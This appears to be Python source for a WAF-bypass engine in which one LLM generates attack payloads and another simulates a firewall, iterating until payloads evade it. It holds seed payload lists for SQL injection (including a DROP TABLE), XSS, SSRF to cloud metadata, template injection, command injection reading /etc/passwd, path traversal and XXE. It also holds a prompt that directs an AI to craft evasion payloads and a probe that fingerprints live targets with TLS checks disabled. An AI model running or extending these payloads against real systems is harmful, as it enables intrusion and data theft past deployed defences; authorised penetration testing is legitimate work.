"""
adversarial_waf_engine.py — Adversarial Self-Play WAF Bypass Engine

Two competing LLM instances:
- Attacker-LLM: generates payloads targeting a specific vuln type
- WAF-Simulator-LLM: simulates WAF behavior, evaluates each payload

The Attacker evolves payloads iteratively using feedback from the WAF-Simulator
until bypass is achieved or max iterations reached. Successful bypass patterns
are stored in MemoryManager for cross-scan reuse.

This is a NEW capability — no existing implementation. Council Sprint 3.
"""
from __future__ import annotations

import json
import logging
import re
import time
import urllib.request
import urllib.parse
import ssl
from dataclasses import dataclass, field
from typing import Optional

log = logging.getLogger("oneinfinity.ai_security.adversarial_waf")


# ---------------------------------------------------------------------------
# WAF signature detection patterns
# ---------------------------------------------------------------------------

_WAF_HEADERS = frozenset({
    "cf-ray", "x-cloudflare", "x-sucuri-id", "x-fw-token",
    "x-waf-rule", "x-amz-cf-id", "x-cdn", "x-firewall-protection",
    "x-iinfo", "server-timing", "x-akamai-transformed",
})

_WAF_BODY_RE = re.compile(
    r"cloudflare|access denied|request blocked|web application firewall|"
    r"attention required|ddos protection|please enable cookies|"
    r"security check|this page is protected|blocked by|sucuri|akamai|"
    r"imperva|f5 bigip|barracuda|fortinet|modsecurity",
    re.I,
)

_WAF_NAMES = {
    "cf-ray": "Cloudflare",
    "x-sucuri-id": "Sucuri",
    "x-fw-token": "Fortinet",
    "x-akamai-transformed": "Akamai",
    "x-iinfo": "Incapsula/Imperva",
}

# Vuln-type → seed payloads for the first attacker iteration
_SEED_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL,NULL--",
        "1' AND SLEEP(5)--",
        "admin'--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'><svg onload=alert(1)>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    ],
    "ssrf": [
        "http://169.254.169.254/",
        "http://localhost/",
        "file:///etc/passwd",
        "http://[::1]/",
        "http://0.0.0.0/",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "{{config}}",
        "{{''.class.mro[2].subclasses()}}",
    ],
    "cmdi": [
        "; id",
        "| cat /etc/passwd",
        "`id`",
        "$(id)",
        "&& whoami",
    ],
    "lfi": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc/passwd",
        "/proc/self/environ",
    ],
    "xxe": [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]><test>&xxe;</test>",
    ],
}


@dataclass
class BypassResult:
    """Result of a WAF bypass attempt for one vuln type."""
    vuln_type: str
    bypassed_payloads: list[str] = field(default_factory=list)
    blocked_payloads: list[str] = field(default_factory=list)
    waf_name: str = ""
    iterations: int = 0
    success: bool = False


class AdversarialWAFEngine:
    """
    Adversarial self-play engine for WAF bypass payload generation.

    Usage::
        engine = AdversarialWAFEngine(vuln_type="sqli", target="https://example.com")
        payloads = engine.generate_bypass_payloads(endpoint="/search?q=1")
    """

    def __init__(
        self,
        vuln_type: str,
        target: str,
        max_iterations: int = 8,
        timeout: int = 10,
    ) -> None:
        self.vuln_type = vuln_type.lower()
        self.target = target
        self.max_iterations = max_iterations
        self.timeout = timeout
        self._ssl_ctx = ssl.create_default_context()
        self._ssl_ctx.check_hostname = False
        self._ssl_ctx.verify_mode = ssl.CERT_NONE
        self._provider = None  # lazy

    def _get_provider(self):
        if self._provider is not None:
            return self._provider
        try:
            from oneinfinity.infra.llm_provider import LLMProviderFactory
            self._provider = LLMProviderFactory().auto_detect()
        except Exception as exc:
            log.debug("[AdversarialWAF] LLM provider unavailable: %s", exc)
        return self._provider

    def detect_waf(self) -> str:
        """
        Make a HEAD request with a benign probe to detect WAF presence.
        Returns WAF name or '' if none detected.
        """
        try:
            base = self.target if self.target.startswith("http") else f"https://{self.target}"
            # Use a benign URL that won't trigger attacks
            req = urllib.request.Request(base, method="HEAD")
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner/1.0)")
            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx) as resp:
                headers = {k.lower(): v for k, v in resp.headers.items()}
                for hdr, name in _WAF_NAMES.items():
                    if hdr in headers:
                        log.info("[AdversarialWAF] WAF detected: %s (header: %s)", name, hdr)
                        return name
            return ""
        except Exception as exc:
            log.debug("[AdversarialWAF] WAF detection probe failed: %s", exc)
            return ""

    def generate_bypass_payloads(
        self,
        endpoint: str = "/",
        known_waf: str = "",
        existing_payloads: list[str] | None = None,
    ) -> list[str]:
        """
        Run self-play loop: Attacker generates → WAF-Sim evaluates → Attacker refines.
        Returns list of payloads that bypassed the WAF-Sim.
        """
        if not known_waf:
            known_waf = self.detect_waf()

        seed = list(_SEED_PAYLOADS.get(self.vuln_type, ["' OR 1=1--"]))
        existing = list(existing_payloads or [])
        attacker_payloads: list[str] = [p for p in seed if p not in existing]
        bypass_payloads: list[str] = []
        blocked_with_reasons: list[dict] = []

        provider = self._get_provider()
        if provider is None:
            log.warning("[AdversarialWAF] No LLM provider — returning seed payloads")
            return seed[:3]

        for iteration in range(self.max_iterations):
            if not attacker_payloads:
                break

            # ── WAF Simulator evaluation ──────────────────────────────────
            defender_prompt = (
                f"You are a {known_waf or 'generic'} WAF (Web Application Firewall) engine. "
                f"Evaluate each of these {self.vuln_type} attack payloads and decide if you would block them. "
                f"Consider: regex patterns, encoding detection, keyword matching, behavioral heuristics.\n\n"
                f"Payloads to evaluate:\n"
                + "\n".join(f"- {p}" for p in attacker_payloads[:10])
                + "\n\nReturn ONLY valid JSON:\n"
                '{"verdicts": [{"payload": "<exact payload>", "blocked": true/false, "reason": "<1 sentence why>"}]}'
            )
            try:
                resp = provider.chat(
                    defender_prompt,
                    system="You are a WAF security system. Respond ONLY with valid JSON.",
                    max_tokens=1500,
                    temperature=0.1,
                )
                verdicts_raw = json.loads(resp.text.strip() if resp else "{}")
                verdicts = verdicts_raw.get("verdicts", [])
            except Exception as exc:
                log.debug("[AdversarialWAF] WAF-sim call failed: %s", exc)
                # Assume all pass on LLM failure (conservative — test them anyway)
                bypass_payloads.extend(attacker_payloads)
                break

            newly_bypassed = []
            newly_blocked = []
            for v in verdicts:
                payload = v.get("payload", "")
                if not payload:
                    continue
                if not v.get("blocked", True):
                    newly_bypassed.append(payload)
                else:
                    newly_blocked.append({"payload": payload, "reason": v.get("reason", "")})

            bypass_payloads.extend(newly_bypassed)
            blocked_with_reasons.extend(newly_blocked)

            log.info(
                "[AdversarialWAF] iter=%d vuln=%s bypassed=%d blocked=%d",
                iteration + 1, self.vuln_type, len(newly_bypassed), len(newly_blocked),
            )

            if not newly_blocked:
                break  # Everything bypassed — stop evolving

            # ── Attacker evolution: refine blocked payloads ───────────────
            blocked_summary = "\n".join(
                f"- Payload: {b['payload']!r} | Blocked because: {b['reason']}"
                for b in newly_blocked[:8]
            )
            attacker_prompt = (
                f"You are an expert penetration tester creating {self.vuln_type} payloads "
                f"to bypass a {known_waf or 'generic'} WAF. "
                f"The following payloads were blocked:\n{blocked_summary}\n\n"
                "Generate 8 NEW payloads that evade these specific blocks. Use techniques like:\n"
                "- Unicode normalization (e.g. \\u0027 for quote)\n"
                "- Double URL encoding (%2527 for %27)\n"
                "- Case variation (SeLeCT instead of SELECT)\n"
                "- Null bytes (\\x00) and comment injection (/**/ between keywords)\n"
                "- HTML entity encoding (&#39; for quote)\n"
                "- Chunked encoding tricks and HTTP parameter pollution\n"
                "- Alternative syntax and equivalent expressions\n\n"
                "Return ONLY valid JSON:\n"
                '{"payloads": ["payload1", "payload2", ...]}'
            )
            try:
                resp = provider.chat(
                    attacker_prompt,
                    system="You are an expert offensive security researcher. Return ONLY JSON.",
                    max_tokens=1000,
                    temperature=0.7,
                )
                new_raw = json.loads(resp.text.strip() if resp else "{}")
                attacker_payloads = [
                    p for p in new_raw.get("payloads", [])
                    if p and p not in bypass_payloads and p not in existing
                ]
            except Exception as exc:
                log.debug("[AdversarialWAF] Attacker evolution failed: %s", exc)
                break

        # Deduplicate
        seen: set[str] = set()
        final: list[str] = []
        for p in bypass_payloads:
            if p not in seen:
                seen.add(p)
                final.append(p)

        log.info(
            "[AdversarialWAF] Complete — vuln=%s waf=%s bypass_count=%d",
            self.vuln_type, known_waf or "unknown", len(final),
        )

        # Store successful patterns in MemoryManager
        if final:
            self._store_successful_patterns(final, known_waf)

        return final

    def generate_all_types(
        self,
        endpoint: str = "/",
        vuln_types: list[str] | None = None,
    ) -> dict[str, list[str]]:
        """
        Run bypass generation for multiple vuln types.
        Returns {vuln_type: [bypass_payloads]}.
        """
        types = vuln_types or ["sqli", "xss", "ssrf", "ssti", "cmdi"]
        known_waf = self.detect_waf()
        results: dict[str, list[str]] = {}
        for vt in types:
            engine = AdversarialWAFEngine(
                vuln_type=vt,
                target=self.target,
                max_iterations=self.max_iterations,
                timeout=self.timeout,
            )
            engine._provider = self._provider  # reuse cached provider
            results[vt] = engine.generate_bypass_payloads(endpoint=endpoint, known_waf=known_waf)
        return results

    def _store_successful_patterns(self, payloads: list[str], waf_name: str) -> None:
        """Persist successful bypass patterns to MemoryManager."""
        try:
            from oneinfinity.infra.memory_manager import MemoryManager, AttackPattern
            import uuid
            mm = MemoryManager()
            for payload in payloads[:20]:  # Cap at 20 per vuln type
                pattern = AttackPattern(
                    id=str(uuid.uuid4())[:8],
                    vuln_type=self.vuln_type,
                    target_tech=waf_name or "generic",
                    payload=payload,
                    endpoint_pattern="*",
                    success_rate=0.8,
                    agent_source="adversarial_waf_engine",
                    meta={"waf_bypassed": waf_name, "source": "self_play"},
                )
                mm.store_attack_pattern(pattern)
        except Exception as exc:
            log.debug("[AdversarialWAF] Pattern storage failed: %s", exc)


# ---------------------------------------------------------------------------
# Module-level convenience function
# ---------------------------------------------------------------------------

def generate_waf_bypass_payloads(
    target: str,
    vuln_types: list[str] | None = None,
    endpoint: str = "/",
    max_iterations: int = 8,
) -> dict[str, list[str]]:
    """
    Convenience function: detect WAF and generate bypass payloads for multiple vuln types.

    Returns {vuln_type: [bypass_payloads]}.
    """
    engine = AdversarialWAFEngine(
        vuln_type="sqli",  # placeholder — generate_all_types handles all
        target=target,
        max_iterations=max_iterations,
    )
    return engine.generate_all_types(endpoint=endpoint, vuln_types=vuln_types)
